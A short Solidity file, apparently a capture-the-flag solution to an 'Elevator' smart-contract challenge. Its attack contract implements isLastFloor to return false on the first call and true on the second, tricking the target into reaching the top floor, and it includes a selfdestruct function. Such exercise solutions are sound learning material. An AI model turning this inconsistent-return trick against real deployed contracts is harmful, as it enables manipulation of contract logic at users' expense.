// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IElevator {
  function goTo(uint) external;
}

contract FakeBuilding {
    
}

contract ElevatorAttack {

    IElevator challenge;
    bool alreadyCalled = false;

    constructor(address _address) {
        challenge = IElevator(_address);
    }

    function isLastFloor(uint) public returns(bool) {
        if (alreadyCalled){
            return true;
        } else {
            alreadyCalled = true;
            return false;
        }
    }

    function attack() public {
        challenge.goTo(1);
    }

    function destroy() public {
        selfdestruct(payable(address(this)));
    }

}